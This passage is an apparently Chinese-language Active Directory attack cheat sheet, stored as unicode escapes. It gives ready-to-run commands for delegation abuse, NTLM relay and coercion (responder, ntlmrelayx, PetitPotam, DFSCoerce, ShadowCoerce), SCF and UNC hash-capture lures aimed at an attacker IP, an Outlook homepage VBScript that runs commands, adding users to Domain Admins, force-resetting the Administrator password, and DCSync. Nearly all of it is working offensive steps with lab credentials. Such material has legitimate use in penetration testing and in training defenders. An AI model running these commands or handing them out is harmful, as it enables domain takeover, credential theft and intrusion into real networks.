\u6307\u5b9a\u7684\u9884\u5b9a\u4e49\u670d\u52a1\u5217\u8868\uff0c\u4f8b\u5982\u540e\u7aef\u670d\u52a1\u670d\u52a1\u5668 B\u3002 \u8bf7\u6ce8\u610f\uff0c\u7ea6\u675f\u59d4\u6d3e\u5141\u8bb8\u670d\u52a1\u51ed\u7a7a\u6a21\u62df\u7528\u6237\uff0c\u65e0\u8bba\u4ed6\u4eec\u662f\u5426\u901a\u8fc7\u670d\u52a1\u8eab\u4efd\u9a8c\u8bc1\u3002\u8bb8\u591a\u4eba\u8ba4\u4e3a\u8fd9\u53d6\u51b3\u4e8e TrustedToAuthForDelegation \u5c5e\u6027\u7684\u914d\u7f6e\u3002 \u7ea6\u675f\u59d4\u6d3e\u53ea\u80fd\u59d4\u6d3e\u8bbf\u95eeSPN\u6307\u5b9a\u7684\u670d\u52a1\uff0c\u6240\u4ee5\u53eb\u7ea6\u675f\u7684\u3002 S4U2SELF\u6982\u5ff5 \u4f7f\u5f97\u670d\u52a1\u53ef\u4ee5\u4ee3\u8868\u7528\u6237\u83b7\u5f97\u9488\u5bf9\u670d\u52a1\u81ea\u8eab\u7684kerberos\u670d\u52a1\u7968\u636e\u3002\u670d\u52a1\u5411KDC\u8ba4\u8bc1\u6210\u529f\u540e\uff0c\u670d\u52a1\u4ee3\u8868\u7528\u6237\u83b7\u5f97\u8bbf\u95ee\u670d\u52a1\u7684\u7968\u636e\u3002 S4U2PROXY\u6982\u5ff5 \u670d\u52a11\u62ff\u7740S4U2SELF\u7533\u8bf7\u5230\u7684\u7968\u636e\u5411\u670d\u52a12\u7533\u8bf7\u8bbf\u95ee\u670d\u52a12\u7684\u7968\u636e \u59d4\u6d3e\u670d\u52a11\u53ea\u80fd\u8bbf\u95ee\u670d\u52a12\u7684\u67d0\u4e9b\u8d44\u6e90\u3002 DC\u4e0a\u914d\u7f6e\u59d4\u6d3e\u7528\u6237\uff0c\u7528\u6765\u5904\u7406\u5176\u4ed6\u7528\u6237\u5bf9DC\u4e0a\u7279\u5b9a\u670d\u52a1\u7684\u8bbf\u95ee\u8bf7\u6c42 DC\u4e0a\u914d\u7f6e\u59d4\u6d3e\u4e3b\u673a\uff0c\u7528\u6765\u5904\u7406\u5176\u4ed6\u7528\u6237\u5bf9DC\u4e0a\u7279\u5b9a\u670d\u52a1\u7684\u8bbf\u95ee\u8bf7\u6c42 1.\u627e\u5230\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u7684\u59d4\u6d3e\u7684\u8d26\u6237\u548c\u4e3b\u673a 2.\u62ff\u4e0b\u6743\u9650 3.\u57fa\u4e8e\u59d4\u6d3e\u670d\u52a1\u7528\u6237\u5411\u670d\u52a1\u5668\u8bf7\u6c42TGT \u4f7f\u7528keko\u5192\u5145\u59d4\u6d3e\u670d\u52a1\u7528\u6237\u8bf7\u6c42TGT\uff0c\u5bc6\u7801\u660e\u6587\uff0chash\uff0caes\u52a0\u5bc6\u90fd\u884c tgt::ask /user: /domain:exp.com /password:password tgt::ask /user:PC2$ /domain:exp1.com /NTLM:29a243bdf1df2e2e770c943e20de4d4b 4.\u901a\u8fc7s4u\u4f2a\u9020administrator@exp.comifs\u670d\u52a1 tgs::s4u /tgt:1.kirbi /user:administrator /service:cifs/iis.exp1.com S4U2Self\u83b7\u53d6\u5230\u7684ST1\u4ee5\u53caS4U2Proxy\u83b7\u53d6\u5230\u7684dm08 CIFS\u670d\u52a1\u7684ST2\u4f1a\u4fdd\u5b58\u5728\u5f53\u524d\u76ee\u5f55\u4e0b 5.PTT kerberos::ptt administrator@cifs.kirbi \u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e\u653b\u51fb-RBCD RBCD \u4e0e\u7ea6\u675f\u59d4\u6d3e\u975e\u5e38\u76f8\u4f3c\uff0c\u53ea\u662f\u7ea6\u675f\u7684\u65b9\u5411\u662f\u76f8\u53cd\u7684\u3002\u5b83\u6307\u5b9a\u5141\u8bb8\u8c01\u59d4\u6d3e\u7ed9\u670d\u52a1\uff0c\u800c\u4e0d\u662f\u5141\u8bb8\u670d\u52a1\u59d4\u6d3e\u7ed9\u8c01\u3002\u6362\u8a00\u4e4b\uff0c\u5982\u679c\u5141\u8bb8\u670d\u52a1\u5668 A \u5728\u7ea6\u675f\u59d4\u6d3e\u4e2d\u59d4\u6d3e\u7ed9\u670d\u52a1\u5668 B\uff0c\u5219\u5c06\u5728\u670d\u52a1\u5668 A \u7684\u5c5e\u6027\u4e2d\u914d\u7f6e\u7ea6\u675f\u3002\u5728 RBCD \u4e2d\uff0c\u5b83\u5c06\u5728\u670d\u52a1\u5668 B \u7684\u5c5e\u6027\u4e2d\u8fdb\u884c\u914d\u7f6e\u3002 \u7ea6\u675f\u59d4\u6d3e\u548c RBCD \u4e4b\u95f4\u7684\u53e6\u4e00\u4e2a\u91cd\u8981\u533a\u522b\u662f\uff0c\u7ea6\u675f\u59d4\u6d3e\u6307\u5b9a\u76ee\u6807\u670d\u52a1\u7684 SPN\u3002\u76f8\u53cd\uff0cRBCD \u5728\u5b89\u5168\u63cf\u8ff0\u7b26\u4e2d\u6307\u5b9a\u88ab\u59d4\u6d3e\u670d\u52a1\u7684 SID\u3002 \u89e3\u91ca\u6709\u70b9\u7ed5\uff0c\u7b80\u5355\u5730\u8bf4\u5c31\u662f\uff0c\u7ea6\u675f\u59d4\u6d3e\u662f\u59d4\u6d3e\u67d0\u4e2a\u670d\u52a1\u80fd\u4ee3\u8868\u7528\u6237\u80fd\u8bbf\u95ee\u54ea\u4e9b\u670d\u52a1\uff08SPN\uff09\uff0c\u8fd9\u662f\u6307\u5b9aSPN\uff1b\u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e\u662f\u59d4\u6d3e\u8fd9\u4e2a\u670d\u52a1\uff08SPN\uff09\u80fd\u88ab\u54ea\u4e9b\u88ab\u59d4\u6d3e\u7684\u670d\u52a1\u8bbf\u95ee\uff0c\u6307\u5b9a\u88ab\u59d4\u6d3e\u7684\u90a3\u4e9b\u670d\u52a1\u7684SID\u3002 \u653b\u51fb\u5229\u7528 \u9002\u75282012 R2\u548cWindows Server 2012\u53ca\u4ee5\u4e0a\u3002\u5b9e\u73b0\u5229\u7528\u57df\u5185\u7528\u6237\u5bf9\u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e\u673a\u5668\u7684\u653b\u51fb\uff0c\u5982\u679c\u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e\u673a\u5668\u662f\u57df\u63a7\uff0c\u90a3\u4e48\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u57df\u63a7\u7684\u653b\u51fb\u3002 \u5229\u7528\u5f97\u5230\u7684a2\u7528\u6237\u6dfb\u52a0\u4e00\u4e2a\u673a\u5668\u8d26\u6237test2$ addcomputer.py -method SAMR -dc-ip 192.168.52.100 -computer-name test4 -computer-pass Aa123456 \"exp1.com/a2:Aa123123\" \u6a21\u62df\u914d\u7f6etest2$\u5230IIS\u7684\u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e\uff0c\u9700\u8981\u914d\u7f6e\u59d4\u6d3e\u7684\u6743\u9650\uff08msDS-AllowedToDelegateTo\uff09 \u8fd9\u91cc\u662f\u76f4\u63a5\u5728\u83b7\u53d6\u7684\u57df\u5185\u673a\u5668\u4e0a\u6dfb\u52a0\u59d4\u6d3e\u914d\u7f6e\uff08\u66f4\u6539msDS-AllowedToActOnBehalfOfOtherIdentity\u5c5e\u6027\uff09\u3002\u8fd8\u53ef\u4ee5\u5229\u7528\u4e2d\u7ee7\u4fee\u6539\u8d44\u6e90\u59d4\u6d3e\u914d\u7f6e\uff0c\u4f46\u9700\u8981\u88ab\u4fee\u6539\u7684\u673a\u5668\u5f00\u542f\u4e86webclient\u670d\u52a1\u3002 \u4f7f\u7528powerview\u67e5\u8be2sid Get-NetComputer test4 \u8bbe\u7f6e\u8d44\u6e90\u7ea6\u675f\u59d4\u6d3e $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3280894980-4031048059-2076154112-1129)\" $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer IIS| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose S4U\u653b\u51fb\uff0c\u83b7\u53d6\u7ba1\u7406\u5458\u7968\u636e getST.py -dc-ip 192.168.52.100 -spn cifs/iis -impersonate Administrator exp1.com/test2$:Aa123123 \u5bf9IIS\u7684PTT export KRB5CCNAME=Administrator.ccache psexec.py -no-pass -k iis NTML RELAY\u653b\u51fb NTLM\u534f\u8bae\u662f\u52a0\u8f7d\u5728smb\u3001http\u3001ldap\u7b49\u534f\u8bae\u4e0a\u7684\uff0crelay\u653b\u51fb\u7684\u8fc7\u7a0b\u5c31\u662f\u4e2d\u95f4\u4eba\u653b\u51fb\u7684\u8fc7\u7a0b\u3002\u4e3b\u8981\u7528\u4e8e\u57df\u5185\u653b\u51fb\u3002 v1\u7248\u672c\u7684NET NTLM\u62ff\u5230\u76f8\u5f53\u4e8e\u62ff\u5230hash\uff0c\u4f7f\u7528 \u8fd9\u91cc \u7834\u89e3NET NTLMv1\u4e0d\u9700\u8981RELAY\uff0c\u4e0d\u8fc7v1\u7248\u672c\u5728win7/server2008\u4e4b\u540e\u5c31\u4e0d\u9002\u7528\u4e86\uff0c\u4e4b\u540e\u7684\u7248\u672c\u90fd\u662fv2\uff0cv2\u7684\u653b\u51fb\u65b9\u5f0f\u4e3b\u8981\u662frelay\u3002 v2\u7684\u7834\u89e3\u4f7f\u7528hashcat hashcat -m 5600 win10::TEST:1122334455667788:622DED0816CFF5A0652209F20A7CF17A:0101000000000000C0653150DE09D201532C07A7DEE654B8000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000010000000020000067840C88904F15E659858A3CBA35EBEF61A38EC88C5E3D26B968F1C20C9ACAC10A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E003100300030002E0031000000000000000000 /tmp/password.dic --force \u4ee5\u4e0b\u5206\u4e09\u79cd\u4e0d\u540c\u534f\u8bae\u7684\u5229\u7528\u65b9\u5f0f\u8fdb\u884c\u8bf4\u660e\u3002 responder\u5de5\u5177\u53d1\u8d77\u76d1\u542chttps://github.com/lgandx/Responder\uff0c\u4f46\u4e0d\u80fd\u4e2d\u7ee7\u3002 \u76d1\u542c\u542f\u52a8\u540e\uff0c\u4f1a\u81ea\u52a8\u6355\u83b7NTLM\u9a8c\u8bc1 responder -I eth0 -A impacket\u4e0b\u7684ntlmrelayx\u548cldaprelax\u90fd\u53ef\u4ee5\u4e2d\u7ee7\u3002 \u63a5\u6536smb\uff0c\u4e2d\u7ee7\u5230smb ntlmrelayx.py -t smb://10.0.2.5 -c whoami -smb2support \u63a5\u6536smb\uff0c\u4e2d\u7ee7\u5230ldap ntlmrelayx.py -t ldap://10.0.2.5 -c whoami -smb2support RELAY2SMB \u684c\u9762 \u4fee\u6539\u684c\u9762\u7684desktop.ini\u7684IconResource\u8def\u5f84\u4e3aUNC\u8def\u5f84\uff0c\u5f53\u5728\u57df\u63a7\u4e0a\u6253\u5f00\u684c\u9762\u6587\u4ef6\u5939\u65f6\u53ef\u6210\u529f\u653b\u51fb SCF\u6587\u4ef6 \u65b0\u5efascf\u6587\u4ef6\uff0c\u653e\u5230\u6587\u4ef6\u5939\u4e0b\uff0c\u8bf1\u5bfc\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u5939 [Shell] Command=2 IconFile=\\\\10.0.2.4\\scf\\test.ico [Taskbar] Command=ToggleDesktop \u7528\u6237\u5934\u50cf win10\u7684\u60c5\u51b5\u4e0b\uff0c\u4fee\u6539\u7528\u6237\u7684\u5934\u50cf\u4e3aUNC\u5730\u5740 \u547d\u4ee4\u6267\u884c \u4ee5\u4e0b\u662f\u53ef\u4ee5\u643a\u5e26UNC\u7684\u547d\u4ee4\u3002\u90fd\u53ef\u4ee5\u547d\u4ee4\u6267\u884c\u4e86\uff0c\u8fd8\u9700\u8981relay\u5417\uff1f > net.exe use \\hostshare > attrib.exe \\hostshare > bcdboot.exe \\hostshare > bdeunlock.exe \\hostshare > cacls.exe \\hostshare > certreq.exe \\hostshare #(noisy, pops an error dialog) > certutil.exe \\hostshare > cipher.exe \\hostshare > ClipUp.exe -l \\hostshare > cmdl32.exe \\hostshare > cmstp.exe /s \\hostshare > colorcpl.exe \\hostshare #(noisy, pops an error dialog) > comp.exe /N=0 \\hostshare \\hostshare > compact.exe \\hostshare > control.exe \\hostshare > convertvhd.exe -source \\hostshare -destination \\hostshare > Defrag.exe \\hostshare > diskperf.exe \\hostshare > dispdiag.exe -out \\hostshare > doskey.exe /MACROFILE=\\hostshare > esentutl.exe /k \\hostshare > expand.exe \\hostshare > extrac32.exe \\hostshare > FileHistory.exe \\hostshare #(noisy, pops a gui) > findstr.exe * \\hostshare > fontview.exe \\hostshare #(noisy, pops an error dialog) > fvenotify.exe \\hostshare #(noisy, pops an access denied error) > FXSCOVER.exe \\hostshare #(noisy, pops GUI) > hwrcomp.exe -check \\hostshare > hwrreg.exe \\hostshare > icacls.exe \\hostshare > licensingdiag.exe -cab \\hostshare > lodctr.exe \\hostshare > lpksetup.exe /p \\hostshare /s > makecab.exe \\hostshare > msiexec.exe /update \\hostshare /quiet > msinfo32.exe \\hostshare #(noisy, pops a \"cannot open\" dialog) > mspaint.exe \\hostshare #(noisy, invalid path to png error) > msra.exe /openfile \\hostshare #(noisy, error) > mstsc.exe \\hostshare #(noisy, error) > netcfg.exe -l \\hostshare -c p -i foo XSS \u9002\u7528\u4e8eIE\u548cEDGE\uff0c\u8fd8\u53ef\u4ee5\u7ed3\u5408NBNS\u6295\u6bd2\u5229\u7528 <script src=\"api/images/d6p2cWHmAlOa/xss\"> \u90ae\u4ef6 \u540cXSS <img src=\"api/images/FuF94ZAJsdxd/outlook\"> mysql \u9700\u8981\u5177\u5907load_file\u6743\u9650\uff0c\u4e14\u6ca1\u6709secure_file_priv\u7684\u9650\u5236(5.5.53\u9ed8\u8ba4\u662f\u7a7a\uff0c\u4e4b\u540e\u7684\u8bdd\u9ed8\u8ba4\u4e3aNULL\u5c31\u4e0d\u597d\u5229\u7528\u4e86,\u4e0d\u6392\u9664\u4e00\u4e9b\u7ba1\u7406\u5458\u4f1a\u6539) select load_file('\\\\\\\\172.16.100.1\\\\mysql'); NBNS\u548cLLMNR \u6ee5\u7528MachineAccountQuota\u5c5e\u6027\uff0c\u6dfb\u52a0NS\u89e3\u6790\u6761\u76ee Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.0.2.4 XXE&SSRF SSRF\u4f7f\u7528file\u534f\u8bae\uff0cXXE xml\u6587\u4ef6\u4f7f\u7528UNC\u8def\u5f84\u6216http\u534f\u8bae\u3002 \u914d\u5408NBNS\u53ef\u4ee5\u76f4\u63a5\u5229\u7528http\u534f\u8bae MS-RPRN (PrinterBug) \u672c\u5730\u6d4b\u8bd5printerbug.py\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u5f00\u4e86Print Spooler\u670d\u52a1\u4e0d\u884c\uff0c\u8fd8\u9700\u8981\u8bbe\u7f6e\u4e00\u4e2a\u5171\u4eab\u7684\u6253\u5370\u673a\u3002 python printerbug.py exp.com/cs@10.0.2.5 10.0.2.4 SpoolSample.exe \u76ee\u6807 \u56de\u8fde MS-EFSRPC (PetitPotam) \u5229\u7528MS-EFSRPC\u7f3a\u9677\uff0c\u4f7fAD\u5f3a\u5236\u53d1\u9001\u8ba4\u8bc1\uff0c5\u4e3aNTLM\u76d1\u542c\uff0c254\u4e3a\u76ee\u6807DC\u3002 \u53ef\u4ee5\u901a\u8fc7efsrpc\u548clsarpc\u89e6\u53d1\uff0c\u4f46efsrpc\u8f83\u4e0d\u5e38\u89c1\uff0clsarpc\u53ef\u4ee5\u572808\u548c12\u7684\u7cfb\u7edf\u4e0a\u533f\u540d\u89e6\u53d1\uff0c16\u4e0a\u9700\u8981\u4e00\u4e2a\u7528\u6237\u51ed\u636e\u89e6\u53d1\u3002\u662f\u5426\u9700\u8981\u4e00\u4e2a\u57df\u5185\u7528\u6237\u5bc6\u7801\u53d6\u51b3\u4e8e\u57df\u63a7\u7ec4\u7b56\u7565\u4e2d\u7684\"\u53ef\u533f\u540d\u8bbf\u95ee\u7684\u547d\u540d\u7ba1\u9053\"\u7684\u914d\u7f6e\u3002\u7ec4\u7b56\u7565\u4e0d\u4e3a\u7a7a\uff0c\u4e5f\u662f\u53ef\u4ee5\u89e6\u53d1\u7684\u3002 GitHub\u5730\u5740 \u57df\u7528\u6237\u89e6\u53d1 Petitpotam.py -u test -p asdmin123 -d exp1.com -pipe lsarpc 10.0.2.5 10.0.2.254 \u533f\u540d\u89e6\u53d1 python Petitpotam.py -pipe lsarpc 192.168.52.129 192.168.52.100 MS-FSRVP (ShadowCoerce) MS-FSRVP\u662fMicrosoft\u7684\u6587\u4ef6\u670d\u52a1\u5668\u8fdc\u7a0bVSS\u534f\u8bae\u3002\u5b83\u7528\u4e8e\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u521b\u5efa\u6587\u4ef6\u5171\u4eab\u7684\u5377\u5f71\u526f\u672c\uff0c\u4ee5\u53ca\u4fbf\u4e8e\u5907\u4efd\u5e94\u7528\u7a0b\u5e8f\u5728 SMB2 \u5171\u4eab\u4e0a\u6267\u884c\u5e94\u7528\u7a0b\u5e8f\u4e00\u81f4\u6027\u5907\u4efd\u548c\u6570\u636e\u8fd8\u539f\u3002 \u5229\u7528\u6761\u4ef6\u662f\u9700\u8981\u542f\u7528 \u6587\u4ef6\u670d\u52a1\u5668VSS\u4ee3\u7406\u670d\u52a1 python3 shadowcoerce.py -d \"exp1.com\" -u \"t1\" -p \"Aa123123\" 192.168.14.128 192.168.14.100 MS-DFSNM\uff08DFSCoerce\uff09 \u901a\u8fc7\u6307\u5b9a\u5206\u5e03\u5f0f\u6587\u4ef6\u7cfb\u7edf\u7684RPC\u7ba1\u9053netdfs\u6765\u8fdb\u884c\u5f3a\u5236\u4e2d\u7ee7\uff0c\u9700\u8981\u4e00\u4e2a\u57df\u7528\u6237\u548c\u5bc6\u7801\uff08\u6216hash\uff09 https://github.com/Wh04m1001/DFSCoerce 128\u662f\u76d1\u542c\uff0c100\u662f\u76ee\u6807 python dfscoerce.py -u a2 -p Aa123123 192.168.14.128 192.168.14.100 RELAY2EWS https://github.com/Arno0x/NtlmRelayToEWS homepage <html> <head> <meta http-equiv=\"Content-Language\" content=\"en-us\"> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\"> <title>Outlook</title> <script id=clientEventHandlersVBS language=vbscript> <!-- Sub window_onload() Set Application = ViewCtl1.OutlookApplication Set cmd = Application.CreateObject(\"Wscript.Shell\") cmd.Run(\"calc\") End Sub --> </script> </head> <body> <object classid=\"clsid:0006F063-0000-0000-C000-000000000046\" id=\"ViewCtl1\" data=\"\" width=\"100%\" height=\"100%\"></object> </body> </html> RELAY2LDAP \u9ad8\u6743\u9650\u7528\u6237 \u5982\u679cNTLM\u53d1\u8d77\u7528\u6237\u5728\u4ee5\u4e0b\u7528\u6237\u7ec4 Enterprise admins Domain admins Built-in Administrators Backup operators Account operators \u90a3\u4e48\u5c31\u53ef\u4ee5\u5c06\u4efb\u610f\u7528\u6237\u62c9\u8fdb\u8be5\u7ec4\uff0c\u4ece\u800c\u4f7f\u8be5\u7528\u6237\u79f0\u4e3a\u9ad8\u6743\u9650\u7528\u6237\uff0c\u6bd4\u5982\u57df\u7ba1 CVE-2019-1040 ACL\u7684\u5229\u7528 \u4e00\u822c\u60c5\u51b5\u800c\u8a00\uff0c\u57df\u5185\u7684ACL\u5e94\u8be5\u4e0d\u4f1a\u6709\u7279\u522b\u611a\u8822\u7684\u914d\u7f6e\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u7684ACL\u90fd\u662f\u6b63\u5e38\u7684\uff0c\u6ca1\u6709\u529e\u6cd5\u53ef\u5229\u7528\uff0c\u800c\u4e14\u6539\u8d77\u6765\u4e5f\u6bd4\u8f83\u590d\u6742\uff0c\u7ba1\u7406\u5458\u4e00\u822c\u662f\u4e0d\u4f1a\u52a8\u7684\u3002\u4f46\u67d0\u4e9b\u6b63\u5e38\u7684\u8bbe\u7f6e\u53ef\u4ee5\u7528\u6765\u5f62\u6210\u653b\u51fb\u94fe\uff0c\u6700\u7ec8\u83b7\u53d6\u76ee\u6807\u6743\u9650\uff0c\u8fd9\u4e00\u70b9\u9700\u8981\u914d\u5408BH\u4f7f\u7528\u3002 AddMembers \u5b58\u5728AllExtendedRights, Self, WriteProperty, GenericWrite \u6216GenericAll\u65f6\u53ef\u5229\u7528 \u53ef\u4ee5\u5c06\u4efb\u610f\u7528\u6237\uff0c\u7ec4\u6216\u8ba1\u7b97\u673a\u6dfb\u52a0\u5230\u76ee\u6807\u7ec4\u3002 \u5047\u8bbett\u7528\u6237\u7528\u6237\u5bf9domain admins\u7ec4\u6709member\u6743\u9650\uff0c\u90a3\u4e48tt\u5c06\u62e5\u6709\u5bf9\u57df\u7ba1\u7ec4\u5199\u5165\u7528\u6237\u7684\u6743\u9650\u3002\u6362\u4e00\u53e5\u8bdd\u8bf4\uff0ctt\u5c31\u662f\u57df\u7ba1\u3002 \u67e5\u8be2domain admins\u7ec4\u6709\u54ea\u4e9bmember\u6743\u9650 AdFind.exe -users -rb CN=\"domain Admins\" -sc getacl -sddlfilter ;;;member;; \u67e5\u8be2tt\u7528\u6237\u5bf9\u54ea\u4e9b\u5bf9\u8c61\u6709member\u6743\u9650 AdFind.exe -b \"cn=tt,cn=users,dc=exp1,dc=com\" memberOf \u7ed9tt\u7528\u6237\u6dfb\u52a0\u57df\u7ba1\u7ec4\u7684member\u6743\u9650 adfind -users -rb CN=tt -dsq|admod -users -rb CN=\"Domain Admins\" -stdinadd member Powerview\u6dfb\u52a0 Add-DomainGroupMember\u65b9\u6cd5 \u5c06tt\u7528\u6237\u52a0\u5165\u57df\u7ba1\u7ec4 Add-DomainGroupMember -Identity 'Domain Admins' -Members 'tt' net group 'Domain Admins' 'user' /add /domain # Powershell: Active Directory module Add-ADGroupMember -Identity 'Domain Admins' -Members 'user' # Powershell: PowerSploit module Add-DomainGroupMember -Identity 'Domain Admins' -Members 'user' linux # \u7a97\u8f93\u5165\u5bc6\u7801 net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser -S $DomainController # With net and cleartext credentials net rpc group addmem 'domain admins' a1 -U exp1.com/tt%Aa123123 -S 192.168.14.100 # With Pass-the-Hash pth-net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser%ffffffffffffffffffffffffffffffff:$NThash -S $DomainController Force-Change-Password AllExtendedRights\u3001GenericAll \u53ef\u4ee5\u5728\u4e0d\u77e5\u9053\u5f53\u524d\u76ee\u6807\u7528\u6237\u7684\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b\u66f4\u6539\u76ee\u6807\u7528\u6237\u7684\u5bc6\u7801 \u67e5\u8be2 AdFind.exe -b \"cn=administrator,cn=users,dc=exp1,dc=com\" -sc getacl -sddlfilter ;;;password;; admod\u66f4\u6539 admod -b CN=Administrator,CN=Users,DC=exp1,DC=com unicodepwd::123!@#qazwsx -optenc powerview\u66f4\u6539 Set-DomainUserPassword\u65b9\u6cd5 \u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e0d\u80fd\u76f4\u63a5\u8f93\u5165\u660e\u6587\u5bc6\u7801\uff0c\u9700\u8981\u8f6c\u6362\u4ee5\u4e0b\u5b57\u7b26\u7c7b\u578b $pass = ConvertTo-SecureString 'Aa123123' -AsPlainText -Force Set-DomainUserPassword -Identity tt -AccountPassword $pass Linux # \u5f39\u7a97\u8f93\u5165\u5bc6\u7801 net rpc password $TargetUser -U $DOMAIN/$ControlledUser -S $DomainController # With net and cleartext credentials net rpc password $TargetUser -U $DOMAIN/$ControlledUser%$Password -S $DomainController # With Pass-the-Hash pth-net rpc password $TargetUser -U $DOMAIN/$ControlledUser%ffffffffffffffffffffffffffffffff:$NThash -S $DomainController Dcsync\u7684ACL DS-Replication-Get-Changes 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 DS-Replication-Get-Changes-All 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 \u5bf9\u57df\u5bf9\u8c61\u5177\u6709\u8fd9\u4e24\u4e2a\u6269\u5c55\u6743\u9650\u7684\u7528\u6237\u5177\u5907dcsync \u6743\u9650 AllExtendedRights \u6267\u884c\u4e0e\u5bf9\u8c61\u7684\u6269\u5c55Active Directory\u6743\u9650\u76f8\u5173\u8054\u7684\u4efb\u4f55\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c\u5c06\u4e3b\u4f53\u6dfb\u52a0\u5230\u7ec4\u5e76\u5f3a\u5236\u66f4\u6539\u76ee\u6807\u7528\u6237\u7684\u5bc6\u7801\u90fd\u662f\u6269\u5c55\u6743\u9650\u7684\u4f7f\u7528\u793a\u4f8b WriteDacl \u5c06\u65b0ACE\u5199\u5165\u76ee\u6807\u5bf9\u8c61\u7684DACL\u7684\u529f\u80fd\u3002 \u4f8b\u5982\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5411\u76ee\u6807\u5bf9\u8c61DACL\u5199\u5165\u65b0\u7684ACE\uff0c\u4ece\u800c\u4f7f\u653b\u51fb\u8005\u53ef\u4ee5\u201c\u5b8c\u5168\u63a7\u5236\u201d\u76ee\u6807\u5bf9\u8c61\u76f4\u63a5dcsync \u4f7f\u7528New-ADObjectAccessControlEntry\u65b9\u6cd5 GenericWrite \u66f4\u65b0\u4efb\u4f55\u672a\u53d7\u4fdd\u62a4\u7684\u76ee\u6807\u5bf9\u8c61\u7684\u53c2\u6570\u503c\u3002\u4f8b\u5982\uff0c\u66f4\u65b0\u76ee\u6807\u7528\u6237\u5bf9\u8c61\u4e0a\u7684\u201cscriptPath\u201d\u53c2\u6570\u503c\uff0c\u53ef\u4ee5\u4f7f\u8be5\u7528\u6237\u5728\u4e0b\u6b21\u767b\u5f55\u65f6\u8fd0\u884c\u6307\u5b9a\u7684\u53ef\u6267\u884c\u6587\u4ef6\u6216\u547d\u4ee4 Powerview\u4f7f\u7528 Set-DomainObject pc1 -Set @{'mstsinitialprogram'='\\\\192.168.52.129\\share\\calc.exe'} -Verbose WriteOwner \u66f4\u65b0\u76ee\u6807\u5bf9\u8c61\u6240\u6709\u8005 Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y Set the owner of 'dfm' in the current domain to 'harmj0y'. \u7ec4\u7b56\u7565\u76f8\u5173 DC\u4e0a\u5229\u7528 DC\u53ef\u4ee5\u63a7\u5236\u57df\u5185\u6240\u6709\u8ba1\u7b97\u673a\u7684\u7ec4\u7b56\u7565\u3002 \u8f93\u5165gpmc.msc\uff0c\u542f\u52a8\u7ec4\u7b56\u7565\u7ba1\u7406\uff0c\u754c\u9762\u5982\u4e0b\u56fe\u6240\u793a \u8fd9\u91cc\u6709\u4e00\u4e2a\u903b\u8f91\u3002\u7ec4\u7b56\u7565\u5bf9\u8c61\u53ea\u662f\u4e00\u6761\u4e00\u6761\u7684\u89c4\u5219\uff0c\u8fd9\u4e9b\u89c4\u5219\u672c\u8eab\u4e0d\u751f\u6548\uff0c\u9700\u8981\u628a\u8fd9\u4e9b\u89c4\u5219\u94fe\u63a5\u5230\u5bf9\u8c61\u4e2d\u624d\u4f1a\u751f\u6548\u3002\u4e00\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u94fe\u63a5\u591a\u6761\u89c4\u5219\uff0c\u8fd9\u91cc\u5bf9\u8c61\u6700\u5c0f\u5355\u4f4d\u662f\u7ec4\u7ec7\u5355\u4f4d\uff0c\u6700\u5927\u662f\u6574\u4e2a\u6797\u3002 \u5f53\u7ec4\u7b56\u7565\u914d\u7f6e\u751f\u6548\u540e\uff0cDC\u4f1a\u66f4\u65b0\u7ec4\u7b56\u7565\u5e94\u7528\u5230\u81ea\u8eab\u3002 \u8fd9\u91cc\u53ef\u4ee5\u4e0b\u53d1\u8ba1 \u5212\u4efb\u52a1 \u8fd9\u91cc\u53ef\u4ee5\u4e0b\u53d1\u7a0b\u5e8f\uff0c\u53ea\u80fd\u662fmsi\u7684 \u8fd8\u6709\u542f\u52a8\u811a\u672c \u8fd8\u53ef\u4ee5\u6dfb\u52a0\u57df\u7528\u6237\u5230\u7ba1\u7406\u5458\u7ec4 \u975eDC\u4e0a\u5229\u7528 \u5728\u6ca1\u6709\u83b7\u53d6DC\u6743\u9650\u4e4b\u524d\uff0c\u53ef\u4ee5\u7528adfind\u67e5\u8be2\u7ec4\u7b56\u7565\u7684\u6743\u9650\uff0c\u5982\u6709\u914d\u7f6e\u9519\u8bef\u7684\u6743\u9650\uff0c\u5219\u53ef\u4ee5\u8fdb\u884c\u5229\u7528\u3002 \u67e5\u8be2\u7ec4\u7b56\u7565\u7684\u8def\u5f84 adfind -b CN=Policies,CN=System,DC=exp1,DC=com -sddl+++ -s subtree -sdna -sddlfilter ;;;gPCFileSysPath;; -recmute gPCFileSysPath \u67e5\u8be2GPOname adfind -b CN=Policies,CN=System,DC=exp1,DC=com -sddl+++ -s subtree -sdna -sddlfilter ;;;gPCFileSysPath;; -recmute displayName \u67e5\u8be2\u6743\u9650 icacls 